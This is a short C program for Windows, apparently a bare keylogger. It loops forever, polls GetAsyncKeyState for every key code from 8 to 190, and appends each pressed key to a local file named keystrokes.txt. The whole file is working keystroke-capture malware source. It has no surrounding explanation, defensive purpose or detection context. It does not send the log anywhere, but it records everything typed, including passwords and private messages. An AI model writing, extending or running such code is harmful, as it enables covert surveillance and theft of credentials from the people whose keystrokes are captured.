#include <stdio.h>
#include <windows.h>

void log_keystroke(char key) {
    FILE *file = fopen("keystrokes.txt", "a");
    if (file != NULL) {
        fprintf(file, "%c", key);
        fclose(file);
    }
}

int main() {
    char key;
    while (1) {
        for (key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) & 0x8000) {
                log_keystroke(key);
                Sleep(10);
            }
        }
    }
    return 0;
}
